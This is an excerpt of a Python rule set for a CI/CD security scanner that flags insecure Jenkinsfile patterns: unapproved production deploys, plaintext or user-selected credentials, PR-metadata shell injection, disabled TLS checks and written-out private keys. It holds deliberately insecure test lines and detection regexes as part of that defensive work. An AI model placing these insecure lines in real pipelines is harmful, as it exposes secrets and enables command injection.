                r"(?:[Pp]rod|[Pp]roduction|[Ll]ive)[^'\"]*['\"]"
                r"|stage\s*\(['\"]"
                r"(?:[Pp]rod|[Pp]roduction|[Ll]ive)[^'\"]*['\"]"
            ),
            # Covers: input('msg'), input "msg", input message: '...'
            absent_within=r"\binput\b",
            lookahead_lines=20,
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Declarative pipelines: use the stage-level `input {}` directive — it "
            "blocks promotion into the stage until an approver acts, and its "
            "`submitter` field lists the approver user IDs and/or external group "
            "names (comma-separated). Jenkins administrators can always approve "
            "regardless:\n"
            "\n"
            "stage('Deploy to Production') {\n"
            "    input {\n"
            "        message 'Deploy to production?'\n"
            "        ok 'Deploy'\n"
            "        submitter 'release-approvers'\n"
            "    }\n"
            "    steps {\n"
            "        sh './deploy.sh prod'\n"
            "    }\n"
            "}\n"
            "\n"
            "Scripted pipelines (or when the approval must sit inside `steps {}`): "
            "use the input step directly:\n"
            "\n"
            "  input message: 'Deploy to production?', ok: 'Deploy', submitter: 'release-approvers'\n"
            "\n"
            "Add a timeout to auto-abort unreviewed deployments so a dangling "
            "input does not pin a runner forever:\n"
            "  timeout(time: 1, unit: 'HOURS') { input 'Deploy?' }"
        ),
        reference="https://www.jenkins.io/doc/pipeline/steps/pipeline-input-step/",
        test_positive=[
            "stage('Deploy to Production') {\n  steps {\n    sh './deploy.sh prod'\n  }\n}",
            "stage('Release to Live') {\n  steps {\n    sh './release.sh'\n  }\n}",
            "stage('Prod Deploy') {\n  steps {\n    sh './deploy.sh'\n  }\n}",
        ],
        test_negative=[
            "stage('Deploy to Production') {\n  steps {\n    input 'Approve?'\n    sh './deploy.sh prod'\n  }\n}",
            "stage('Build') {\n  steps {\n    sh 'make build'\n  }\n}",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "Without a manual approval gate, any automated pipeline trigger — including a "
            "push from an attacker who has compromised a branch or merged a malicious PR — "
            "can execute production deployment commands with no human review. A compromised "
            "commit reaching the deploy stage has full access to production infrastructure "
            "via the Jenkins agent's credentials."
        ),
    ),
    # =========================================================================
    # SEC9-JK-002: archiveArtifacts without fingerprinting
    # =========================================================================
    Rule(
        id="SEC9-JK-002",
        title="archiveArtifacts called without fingerprint: true",
        severity=Severity.LOW,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-9",
        description=(
            "A Jenkins pipeline archives build artifacts without enabling "
            "`fingerprint: true`. Fingerprinting records an MD5 hash of each "
            "archived artifact in Jenkins, creating a traceable record of which "
            "build produced which binary. Without fingerprinting, there is no "
            "built-in way to verify that a deployed artifact matches what was "
            "produced by a specific build — an attacker who replaces an artifact "
            "between archiving and deployment cannot be detected through Jenkins logs."
        ),
        pattern=SequencePattern(
            pattern_a=r"\barchiveArtifacts\b",
            absent_within=r"fingerprint\s*:\s*true",
            lookahead_lines=5,
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Enable Jenkins fingerprinting so Jenkins records an MD5 of every "
            "archived artefact for cross-build traceability:\n"
            "\n"
            "// Before\n"
            "archiveArtifacts artifacts: 'dist/**/*.jar'\n"
            "\n"
            "// After\n"
            "archiveArtifacts artifacts: 'dist/**/*.jar', fingerprint: true\n"
            "\n"
            "Note: Jenkins fingerprints are MD5 and are intended for traceability "
            "(which build produced which file), not tamper-evidence. For "
            "cryptographic integrity, also generate and archive a SHA256 checksum "
            "manifest alongside the artefacts — and sign it if you have a signing "
            "key available:\n"
            "\n"
            "sh 'sha256sum dist/**/*.jar > dist/SHA256SUMS'\n"
            "archiveArtifacts artifacts: 'dist/**', fingerprint: true"
        ),
        reference="https://www.jenkins.io/doc/pipeline/steps/core/#archiveartifacts-archive-the-artifacts",
        test_positive=[
            "archiveArtifacts artifacts: 'dist/**'",
            "archiveArtifacts 'target/*.jar'",
            "archiveArtifacts(artifacts: 'build/**', fingerprint: false)",
        ],
        test_negative=[
            "archiveArtifacts artifacts: 'dist/**', fingerprint: true",
            "// archiveArtifacts 'target/*.jar'",
        ],
        stride=["R", "T"],
        threat_narrative=(
            "Without fingerprinting, there is no record in Jenkins of which build "
            "produced which archived binary, making it impossible to trace an "
            "artefact back to its origin build. Jenkins fingerprints (MD5) cover "
            "the traceability case — they are not cryptographic tamper evidence, "
            "but they are the minimum evidence chain Jenkins itself can provide "
            "for supply chain forensics."
        ),
    ),
    # =========================================================================
    # SEC2-JK-001: Credentials stored in build parameters
    # =========================================================================
    Rule(
        id="SEC2-JK-001",
        title="Credential stored as build parameter instead of Jenkins credential store",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-2",
        description=(
            "A Jenkins pipeline defines a `password` type build parameter. "
            "Password parameters are stored in the Jenkins job configuration as "
            "plain text (or weakly encrypted), visible in the build history, "
            "accessible via the Jenkins API to anyone with read access to the job, "
            "and logged in the parameter list for each build. "
            "Jenkins Credentials Binding is specifically designed for this purpose "
            "and provides proper encryption, access control, and audit logging. "
            "Use `string(credentialsId: '...')` or `usernamePassword(...)` bindings "
            "instead of password parameters."
        ),
        pattern=RegexPattern(
            match=r"\bpassword\s*\(\s*name\s*:",
            exclude=[r"^\s*//", r"usernamePassword\s*\("],
        ),
        remediation=(
            "Replace password parameters with Jenkins credential bindings:\n\n"
            "// BAD — parameter stored in job config, visible in build history\n"
            "parameters {\n"
            "    password(name: 'API_TOKEN', defaultValue: '', description: 'Token')\n"
            "}\n\n"
            "// GOOD — credential stored in Jenkins credential store\n"
            "withCredentials([string(credentialsId: 'my-api-token', variable: 'API_TOKEN')]) {\n"
            "    sh 'curl -H \"Authorization: Bearer $API_TOKEN\" https://api.example.com'\n"
            "}\n\n"
            "Add the credential via: Manage Jenkins → Credentials → System → "
            "Global credentials (unrestricted) → Add Credentials."
        ),
        reference="https://www.jenkins.io/doc/book/using/using-credentials/",
        test_positive=[
            "parameters {\n    password(name: 'SECRET', defaultValue: '', description: 'API secret')\n}",
            "password(name: 'DEPLOY_TOKEN', defaultValue: '')",
        ],
        test_negative=[
            "withCredentials([string(credentialsId: 'my-token', variable: 'TOKEN')])",
            "// password(name: 'SECRET', defaultValue: '')",
            "usernamePassword(credentialsId: 'creds', usernameVariable: 'USER', passwordVariable: 'PASS')",
        ],
        stride=["I"],
        threat_narrative=(
            "Password-type build parameters are stored as plain text in the Jenkins job "
            "configuration, visible in build history via the Jenkins API to anyone with "
            "read access to the job. Unlike Jenkins credentials, build parameters are not "
            "masked in logs and are exposed in the parameter list for every build run."
        ),
    ),
    # =========================================================================
    # SEC2-JK-002: credentialsId bound from user-controlled build parameter
    # =========================================================================
    Rule(
        id="SEC2-JK-002",
        title="credentialsId bound from user-controlled build parameter — attacker selects credential",
        severity=Severity.CRITICAL,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-2",
        description=(
            "A Jenkins pipeline uses a value from params.* as the credentialsId argument "
            "in a withCredentials() binding. This lets anyone who can trigger the build "
            "specify which credential from the Jenkins store is bound — including highly "
            "privileged credentials (production deploy keys, admin API tokens). "
            "By setting the parameter to a known credential ID and running a step that "
            "echoes or exfiltrates the bound variable, an attacker can extract any "
            "credential they know the ID of."
        ),
        pattern=RegexPattern(
            match=r"credentialsId\s*:\s*params\.",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Never derive credentialsId from user-controlled parameters. Hardcode or "
            "validate against a strict allowlist:\n\n"
            "// BAD\n"
            "withCredentials([string(credentialsId: params.CRED_ID, variable: 'TOKEN')]) { ... }\n\n"
            "// GOOD — hardcoded ID\n"
            "withCredentials([string(credentialsId: 'production-api-token', variable: 'TOKEN')]) { ... }\n\n"
            "// ACCEPTABLE — strict allowlist\n"
            "def ALLOWED = ['staging-token', 'dev-token']\n"
            "if (!ALLOWED.contains(params.CRED_ID)) { error 'Unauthorized credential' }\n"
            "withCredentials([string(credentialsId: params.CRED_ID, variable: 'TOKEN')]) { ... }"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials",
        test_positive=[
            "withCredentials([string(credentialsId: params.CREDENTIAL_ID, variable: 'TOKEN')]) {\n    sh './deploy.sh'\n}",
            "withCredentials([usernamePassword(credentialsId: params.CREDS, usernameVariable: 'U', passwordVariable: 'P')]) { sh 'docker login' }",
        ],
        test_negative=[
            "withCredentials([string(credentialsId: 'my-api-token', variable: 'TOKEN')]) { sh './deploy.sh' }",
            "// credentialsId: params.CREDENTIAL_ID",
        ],
        stride=["E", "I"],
        threat_narrative=(
            "Binding a credentialsId from a user-controlled build parameter allows any user "
            "with build trigger access to specify which credential Jenkins retrieves and "
            "binds to the build environment — effectively granting access to arbitrary "
            "credentials in the Jenkins store. An attacker can enumerate available "
            "credential IDs and extract secrets they are not authorized to use by "
            "triggering builds with crafted parameter values."
        ),
    ),
    # =========================================================================
    # SEC2-JK-003: hardcoded credentials in a ``docker login`` or
    # ``docker run -e *_PASSWORD=<literal>`` shell step.  Jenkins port of
    # SEC2-GH-004 — but the attack surface looks different on Jenkins
    # because there's no ``container:``/``services:`` block.  Credentials
    # typically reach a Jenkinsfile via one of two insecure shapes:
    #   (1) ``sh 'docker login -u user -p <literal>'`` in a stage step
    #   (2) ``sh 'docker run -e POSTGRES_PASSWORD=<literal> ...'`` for
    #       a sidecar container spawned from a shell step.
    # The safe form is ``withCredentials`` from the Jenkins credential
    # store, which binds the secret into an env var at runtime and does
    # not appear in the Jenkinsfile.
    # =========================================================================
    Rule(
        id="SEC2-JK-003",
        title="Hardcoded credentials in Jenkinsfile docker / service shell step",
        severity=Severity.CRITICAL,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-2",
        description=(
            "A shell step in a Jenkinsfile passes a credential as a "
            "literal string on the command line — either as ``docker "
            "login -u <user> -p <password>`` or as ``docker run -e "
            "*_PASSWORD=<literal>`` for a sidecar container.  Literal "
            "credentials in a Jenkinsfile are readable by anyone with "
            "SCM read access, echoed in Jenkins build logs when the "
            "shell line executes, and permanently preserved in git "
            "history.  The safe form is ``withCredentials`` bound to "
            "an entry in the Jenkins credential store — the literal "
            "never touches the Jenkinsfile, and Jenkins masks the "
            "bound variable in log output."
        ),
        pattern=RegexPattern(
            # Two insecure shapes in one alternation:
            #
            #  (a) docker login -u user -p <literal>
            #      Excludes: values that are `$VAR`, `"${...}"`, or
            #      `\$VAR` (escaped so Groovy doesn't interpolate
            #      before `sh` runs).
            #
            #  (b) docker run [...] -e KEY_PASSWORD=<literal>
            #      Targets the same *_PASSWORD / *_PASS / *_TOKEN
            #      suffix family as SEC2-GL-003 so the two rules tell
            #      the same story on the same attack class.
            match=(
                r"(?:"
                # docker login with literal -p value
                r"\bdocker\s+login\b[^\n]*?"
                r"(?:-p|--password(?:-stdin)?)\s+"
                r"['\"]?(?![\$\\])[^\s'\"`]{3,}"
                r"|"
                # docker run with literal -e KEY_PASSWORD=...
                r"\bdocker\s+run\b[^\n]*?"
                r"-e\s+['\"]?(?:[A-Z][A-Z0-9_]*_(?:PASSWORD|PASS|TOKEN|SECRET))"
                r"=(?![\$\\])[^\s'\"`]{3,}"
                r")"
            ),
            exclude=[
                r"^\s*//",
                r"^\s*\*",
                r"^\s*#",
                # Paired with --password-stdin and a piped value is the
                # safe shape even though it matches the login prefix.
                r"--password-stdin\b",
            ],
        ),
        remediation=(
            "Bind credentials from the Jenkins store with\n"
            "``withCredentials`` — the secret is injected into an env\n"
            "var at runtime, masked in log output, and never written\n"
            "into the Jenkinsfile.\n\n"
            "// BAD\n"
            "sh 'docker login -u ci-bot -p hunter2 registry.example.com'\n\n"
            "// GOOD — credential store + env reference\n"
            "withCredentials([usernamePassword(\n"
            "        credentialsId: 'registry-creds',\n"
            "        usernameVariable: 'REG_USER',\n"
            "        passwordVariable: 'REG_PASS')]) {\n"
            '    sh \'echo "$REG_PASS" | docker login -u "$REG_USER" --password-stdin registry.example.com\'\n'
            "}\n\n"
            "// BAD\n"
            "sh 'docker run -e POSTGRES_PASSWORD=hardcoded_pass postgres:15'\n\n"
            "// GOOD — credential bound into the job's env\n"
            "withCredentials([string(credentialsId: 'pg-pass',\n"
            "                        variable: 'POSTGRES_PASSWORD')]) {\n"
            "    sh 'docker run -e POSTGRES_PASSWORD=\"$POSTGRES_PASSWORD\" postgres:15'\n"
            "}"
        ),
        reference=("https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials"),
        test_positive=[
            # docker login with literal password
            "sh 'docker login -u ci-bot -p hunter2 registry.example.com'",
            'sh "docker login --password myrealpass -u deploy registry"',
            # docker run with literal -e PASSWORD
            "sh 'docker run -e POSTGRES_PASSWORD=literalvalue postgres:15'",
            'sh """docker run -d -e MYSQL_PASSWORD=rootpw mysql:8"""',
            # TOKEN form
            "sh 'docker run -e API_TOKEN=real-token-here myimage'",
        ],
        test_negative=[
            # Password piped through stdin — safe canonical form.
            "sh 'echo \"$REG_PASS\" | docker login -u ci-bot --password-stdin registry.example.com'",
            # withCredentials-bound env var — safe, shell sees `$VAR`.
            'sh \'docker login -u "$REG_USER" -p "$REG_PASS" registry.example.com\'',
            # Escaped variable — Groovy leaves literal `$VAR` for the shell.
            'sh "docker run -e POSTGRES_PASSWORD=\\$POSTGRES_PASSWORD postgres:15"',
            # Comments
            "// sh 'docker login -u bot -p secret registry'",
            "# docker run -e PASSWORD=x",
            # Unrelated docker run without a password literal
            "sh 'docker run --rm alpine:3 echo hello'",
        ],
        stride=["I", "E"],
        threat_narrative=(
            "A literal credential on a Jenkins ``sh`` line is readable "
            "by anyone with SCM access and is printed to the build log "
            "when the shell line executes (Jenkins has no way to mask "
            "a value it wasn't told is a secret).  Build logs on a "
            "public Jenkins controller, or one behind SSO with broad "
            "viewing permissions, are a lateral-movement primitive: "
            "an attacker who lands on any account with view-logs "
            "access extracts the credential and reuses it against "
            "whatever service it authenticates to."
        ),
    ),
    # =========================================================================
    # SEC4-JK-004: input step without submitter restriction
    # =========================================================================
    Rule(
        id="SEC4-JK-004",
        title="Jenkins input step without submitter restriction — any user can approve",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkins pipeline uses an input step for manual approval but does not "
            "specify the 'submitter' parameter. Without submitter, any authenticated "
            "Jenkins user can approve the gate — including developers with read-only "
            "access to the job. For production deployments this means the approval "
            "provides no assurance that a qualified person reviewed the change. "
            "An attacker with any Jenkins login could approve their own malicious deployment."
        ),
        pattern=SequencePattern(
            pattern_a=r"\binput\b\s*(?:message\s*:|[('\"])",
            absent_within=r"\bsubmitter\s*:",
            lookahead_lines=5,
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Restrict approvals to a named group or user:\n\n"
            "input {\n"
            "    message 'Deploy to production?'\n"
            "    ok 'Deploy'\n"
            "    submitter 'release-team,ops-leads'   // comma-separated user IDs or groups\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/pipeline/steps/pipeline-input-step/",
        test_positive=[
            "input message: 'Deploy?', ok: 'Deploy'",
            "input('Ready to deploy to production?')",
        ],
        test_negative=[
            "input message: 'Deploy?', submitter: 'release-team', ok: 'Deploy'",
            "// input message: 'Deploy?'",
        ],
        stride=["S", "E"],
        threat_narrative=(
            "An input step without a submitter restriction allows any Jenkins user — "
            "including those with only read access — to approve a production deployment by "
            "clicking 'Proceed'. Legitimate approval gates depend on submitter restriction "
            "to enforce that only designated release managers or change approvers can "
            "authorize deployments."
        ),
    ),
    # =========================================================================
    # SEC4-JK-005: Additional PR author/URL env vars used in shell
    # =========================================================================
    Rule(
        id="SEC4-JK-005",
        title="PR author or URL environment variable used in shell — attacker-controlled content",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-4",
        description=(
            "A Jenkins pipeline interpolates CHANGE_AUTHOR_EMAIL, CHANGE_AUTHOR_DISPLAY_NAME, "
            "CHANGE_URL, GIT_COMMITTER_NAME, or GIT_COMMITTER_EMAIL into a shell command. "
            "These are populated from pull request metadata and are entirely attacker-controlled. "
            "A crafted display name or email containing shell metacharacters enables command "
            "injection. SEC4-JK-002 covers GIT_BRANCH, BRANCH_NAME, CHANGE_BRANCH, "
            "CHANGE_TITLE, and CHANGE_AUTHOR; this rule covers the remaining PR author fields."
        ),
        pattern=RegexPattern(
            match=(
                r'sh\s+["\'].*\$\{?env\.'
                r"(?:CHANGE_AUTHOR_EMAIL|CHANGE_AUTHOR_DISPLAY_NAME|CHANGE_URL"
                r"|GIT_COMMITTER_NAME|GIT_COMMITTER_EMAIL)\b"
            ),
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Pass PR metadata through environment variables and validate before use:\n\n"
            "// BAD\n"
            'sh "git config user.email ${env.CHANGE_AUTHOR_EMAIL}"\n\n'
            "// GOOD\n"
            'withEnv(["AUTHOR_EMAIL=${env.CHANGE_AUTHOR_EMAIL}"]) {\n'
            "    sh '''\n"
            "        echo \"$AUTHOR_EMAIL\" | grep -qE '^[^@]+@[^@]+$' || exit 1\n"
            '        git config user.email "$AUTHOR_EMAIL"\n'
            "    '''\n"
            "}"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution",
        test_positive=[
            'sh "git config user.email ${env.CHANGE_AUTHOR_EMAIL}"',
            "sh \"notify.sh '${env.CHANGE_AUTHOR_DISPLAY_NAME}'\"",
            "sh \"curl -d 'url=${env.CHANGE_URL}' https://tracker.example.com\"",
        ],
        test_negative=[
            'sh "echo Build: ${env.BUILD_NUMBER}"',
            "sh 'git config user.email ci@example.com'",
            '// sh "git config user.email ${env.CHANGE_AUTHOR_EMAIL}"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "CHANGE_TITLE, CHANGE_AUTHOR, and related PR-derived variables are populated "
            "from user-controlled PR metadata and can contain shell metacharacters. When "
            "used in Groovy GString interpolation inside a sh() call, a contributor who "
            "controls the PR title or description can inject shell commands that run with "
            "the pipeline's agent permissions."
        ),
    ),
    # =========================================================================
    # SEC5-JK-001: Deploy stage without disableConcurrentBuilds
    # =========================================================================
    Rule(
        id="SEC5-JK-001",
        title="Pipeline with deploy stage lacks disableConcurrentBuilds — concurrent deployment race",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-5",
        description=(
            "A Jenkins pipeline contains a deployment stage but does not use "
            "disableConcurrentBuilds() in the options block. Without this, multiple "
            "simultaneous pipeline runs can execute deployment stages in parallel against "
            "the same target environment, causing race conditions or one run overwriting "
            "the state established by another. This is the Jenkins equivalent of "
            "GitLab's resource_group: feature."
        ),
        pattern=ContextPattern(
            anchor=r"stage\s*\(['\"].*(?:[Dd]eploy|[Pp]roduct|[Rr]elease|[Ll]ive)[^'\"]*['\"]",
            requires=r"stage\s*\(['\"].*(?:[Dd]eploy|[Pp]roduct|[Rr]elease|[Ll]ive)",
            requires_absent=r"\bdisableConcurrentBuilds\s*\(",
            scope="file",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Add disableConcurrentBuilds to the pipeline options block:\n\n"
            "pipeline {\n"
            "    options {\n"
            "        disableConcurrentBuilds(abortPrevious: true)\n"
            "    }\n"
            "    ...\n"
            "    stage('Deploy to Production') { ... }\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/syntax/#options",
        test_positive=[
            "pipeline {\n  stages {\n    stage('Deploy to Production') {\n      steps { sh './deploy.sh' }\n    }\n  }\n}",
            "stage('Release to Live') {\n  steps { sh './release.sh' }\n}",
        ],
        test_negative=[
            "pipeline {\n  options { disableConcurrentBuilds() }\n  stages {\n    stage('Deploy to Production') { steps { sh './deploy.sh' } }\n  }\n}",
            "stage('Build') {\n  steps { sh 'make' }\n}",
        ],
        stride=["T", "D"],
        threat_narrative=(
            "Without disableConcurrentBuilds, multiple pipeline runs triggered in rapid "
            "succession can execute deployment stages simultaneously against the same "
            "environment, causing race conditions where one deployment overwrites the other "
            "or leaves infrastructure in an inconsistent state. This is especially "
            "dangerous for database migrations or infrastructure provisioning."
        ),
    ),
    # =========================================================================
    # SEC3-JK-003: docker.image().inside() with mutable tag
    # =========================================================================
    Rule(
        id="SEC3-JK-003",
        title="docker.image().inside() uses mutable :latest or untagged image",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A Jenkins pipeline calls docker.image().inside() with a Docker image "
            "referenced by ':latest' or no tag. The image becomes the execution "
            "environment for all commands inside the block, with access to bound "
            "credentials, workspace contents, and environment variables. A compromised "
            "upstream ':latest' gives an attacker arbitrary code execution inside the "
            "build environment. This is distinct from SEC8-JK-001 which covers "
            "`agent { docker { image '...' } }` — this rule covers the pipeline step pattern."
        ),
        pattern=RegexPattern(
            match=(
                r"docker\.image\s*\(\s*['\"]"
                r"(?:[a-zA-Z0-9][^@'\"]*:latest|[a-zA-Z0-9][a-zA-Z0-9._\-/]+)"
                r"['\"]"
            ),
            exclude=[
                r"^\s*//",
                r"@sha256:",
                r":(?!latest)[a-zA-Z0-9]",
            ],
        ),
        remediation=(
            "Pin the image to a SHA256 digest:\n\n"
            "// BAD\n"
            "docker.image('ubuntu:latest').inside { sh 'make test' }\n\n"
            "// GOOD\n"
            "docker.image('ubuntu@sha256:abc123...').inside { sh 'make test' }"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/docker/",
        test_positive=[
            "docker.image('ubuntu:latest').inside { sh 'make test' }",
            "docker.image('python:latest').inside { sh 'pytest' }",
            "docker.image('node').inside { sh 'npm test' }",
        ],
        test_negative=[
            "docker.image('ubuntu:22.04').inside { sh 'make test' }",
            "docker.image('ubuntu@sha256:abc123').inside { sh 'make' }",
            "// docker.image('ubuntu:latest').inside { sh 'make' }",
        ],
        stride=["T"],
        threat_narrative=(
            "docker.image().inside() with a mutable :latest or untagged reference changes "
            "the execution environment silently with every upstream registry push. The "
            "container executes all pipeline commands with access to the workspace, bound "
            "credentials, and environment variables — a compromised image has full build "
            "access."
        ),
    ),
    # =========================================================================
    # SEC6-JK-004: TLS certificate verification disabled in shell step
    # =========================================================================
    Rule(
        id="SEC6-JK-004",
        title="TLS certificate verification disabled in shell step",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkins pipeline shell step runs curl with -k/--insecure or wget with "
            "--no-check-certificate, disabling TLS certificate verification. This allows "
            "man-in-the-middle attacks: an attacker on the network path can intercept "
            "the connection, serve a forged certificate, and inject malicious content "
            "into the response — including malicious scripts, forged artifacts, or "
            "false API responses that compromise the build or deployment."
        ),
        pattern=RegexPattern(
            match=r"(?:curl\b[^\n]*(?:\s-k\b|\s--insecure\b)|wget\b[^\n]*\s--no-check-certificate\b)",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Fix the underlying certificate issue rather than disabling verification:\n\n"
            "// BAD\n"
            "sh 'curl -k https://internal.example.com/api'\n\n"
            "// GOOD — add CA cert to trust store\n"
            "sh 'curl --cacert /etc/ssl/certs/internal-ca.pem https://internal.example.com/api'"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/",
        test_positive=[
            "sh 'curl -k https://internal.example.com/data'",
            "sh 'curl --insecure https://api.example.com/endpoint'",
            "sh 'wget --no-check-certificate https://example.com/file.tar.gz'",
        ],
        test_negative=[
            "sh 'curl https://example.com/data'",
            "sh 'curl --cacert /etc/ssl/ca.pem https://internal.example.com'",
            "// sh 'curl -k https://example.com'",
        ],
        stride=["I", "T"],
        threat_narrative=(
            "Disabling TLS certificate verification removes the cryptographic guarantee "
            "that the server you are communicating with is authentic, opening the "
            "connection to MITM attacks that can read credentials in transit and substitute "
            "malicious responses. Credentials sent over an unverified connection are "
            "effectively public."
        ),
    ),
    # =========================================================================
    # SEC6-JK-005: Long-lived cloud credentials in environment block
    # =========================================================================
    Rule(
        id="SEC6-JK-005",
        title="Long-lived cloud credential in Jenkins environment block — use OIDC plugin instead",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "The pipeline environment block references long-lived cloud provider "
            "credentials (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, "
            "GOOGLE_APPLICATION_CREDENTIALS, AZURE_CLIENT_SECRET). These are static "
            "credentials that remain valid indefinitely — a leaked key gives "
            "persistent cloud access. Modern Jenkins setups exchange a short-lived "
            "OIDC token minted by Jenkins for temporary provider credentials. The "
            "AWS flavour uses the pipeline-aws plugin's `withAWS(role: ...)` for "
            "STS AssumeRole (optionally seeded with an OIDC token from the "
            "oidc-provider plugin); do NOT conflate this with the aws-credentials "
            "plugin, which only stores static access keys."
        ),
        pattern=RegexPattern(
            match=(
                r"(?i)(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY"
                r"|GOOGLE_APPLICATION_CREDENTIALS|GOOGLE_CREDENTIALS"
                r"|AZURE_CLIENT_SECRET|AZURE_CREDENTIALS)\s*="
            ),
            exclude=[r"^\s*//", r"\$\{env\.", r"\$\{"],
        ),
        remediation=(
            "Exchange a Jenkins-minted OIDC token for temporary provider "
            "credentials. For AWS, use the pipeline-aws plugin's `withAWS(role: ...)` "
            "to assume an IAM role; the role's trust policy should trust the "
            "Jenkins OIDC issuer (configured via the oidc-provider plugin) so the "
            "build never handles a long-lived key:\n"
            "\n"
            "// Requires: pipeline-aws plugin + oidc-provider plugin\n"
            "withAWS(role: 'arn:aws:iam::123456789012:role/ci-deploy',\n"
            '        roleSessionName: "jenkins-${env.BUILD_NUMBER}",\n'
            "        region: 'us-east-1') {\n"
            "    sh 'aws s3 sync dist/ s3://my-bucket/'\n"
            "}\n"
            "\n"
            "Plugin homepages:\n"
            "  - pipeline-aws (withAWS): https://plugins.jenkins.io/pipeline-aws/\n"
            "  - oidc-provider (mints OIDC tokens): https://plugins.jenkins.io/oidc-provider/\n"
            "\n"
            "The legacy aws-credentials plugin stores static access keys and is "
            "NOT the OIDC path — replace it with the combination above."
        ),
        reference="https://plugins.jenkins.io/pipeline-aws/",
        test_positive=[
            "environment {\n    AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE'\n    AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG'\n}",
            "    GOOGLE_APPLICATION_CREDENTIALS = '/path/to/key.json'",
            "    AWS_ACCESS_KEY_ID = credentials('aws-access-key')",
        ],
        test_negative=[
            "    AWS_REGION = 'us-east-1'",
            "// GOOGLE_APPLICATION_CREDENTIALS = '/key.json'",
        ],
        stride=["I", "E"],
        threat_narrative=(
            "Cloud credentials bound in the environment block are scoped to the entire "
            "pipeline and injected as environment variables into every sh() step, "
            "widening the scope compared to withCredentials scoping. A leaked "
            "AWS_ACCESS_KEY_ID remains valid indefinitely — unlike OIDC tokens which expire "
            "within minutes of the build."
        ),
    ),
    # =========================================================================
    # SEC6-JK-006: writeFile writing private key or credential material
    # =========================================================================
    Rule(
        id="SEC6-JK-006",
        title="writeFile step writes private key or credential material to workspace",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkins pipeline uses writeFile to write content containing a private key, "
            "certificate, or credential to the workspace. Workspace contents may persist "
            "between builds on permanent agents, be accessible to other pipelines on the "
            "same agent, and can be unintentionally archived if artifact glob patterns "
            "are too broad. Private key material written to disk should be deleted "
            "immediately after use and should never be archived."
        ),
        pattern=RegexPattern(
            match=r"writeFile\b.*(?:PRIVATE\s+KEY|id_rsa|\.pem|\.pfx|\.p12|BEGIN\s+(?:CERTIFICATE|EC|RSA|DSA))",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Use withCredentials sshUserPrivateKey binding — Jenkins manages the temp file:\n\n"
            "withCredentials([sshUserPrivateKey(credentialsId: 'deploy-key', keyFileVariable: 'KEY_FILE')]) {\n"
            "    sh 'ssh -i \"$KEY_FILE\" user@host ./deploy.sh'\n"
            "}\n\n"
            "If writeFile is unavoidable, always delete in a finally block:\n"
            "try {\n"
            "    writeFile file: '/tmp/deploy.pem', text: pemContent\n"
            "    sh 'ssh -i /tmp/deploy.pem user@host ./deploy.sh'\n"
            "} finally {\n"
            "    sh 'rm -f /tmp/deploy.pem'\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials",
        test_positive=[
            "writeFile file: 'deploy.pem', text: privateKeyContent",
            "writeFile(file: '/tmp/id_rsa', text: env.SSH_PRIVATE_KEY)",
            "writeFile file: 'server.p12', text: keystoreData",
        ],
        test_negative=[
            "writeFile file: 'config.json', text: configContent",
            "writeFile file: 'README.md', text: 'Build completed'",
            "// writeFile file: 'deploy.pem', text: key",
        ],
        stride=["I", "T"],
        threat_narrative=(
            "Private key material written to the workspace persists on the Jenkins agent's "
            "disk between builds on permanent agents and may be inadvertently archived if "
            "artifact glob patterns are too broad. Other pipelines running on the same "
            "agent can read workspace files from prior jobs, exposing the key material to "
            "any build that runs on that node."
        ),
    ),
    # =========================================================================
    # SEC6-JK-007: bat step with Groovy string interpolation of params/env
    # =========================================================================
    Rule(
        id="SEC6-JK-007",
        title="Windows bat step uses Groovy string interpolation of user-controlled value",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkins pipeline bat (Windows batch) step uses Groovy double-quoted string "
            "interpolation to embed a user-controlled value (params.* or env.*) directly "
            "into the command. Groovy resolves the interpolation before cmd.exe sees the "
            "command — on Windows this enables injection via & | > < and similar "
            "metacharacters. This is the Windows equivalent of the shell injection risk "
            "covered by SEC4-JK-001 and SEC4-JK-002."
        ),
        pattern=RegexPattern(
            match=r'bat\s+["\'].*\$\{?\s*(?:params|env)\.',
            exclude=[r"^\s*//"],
        ),
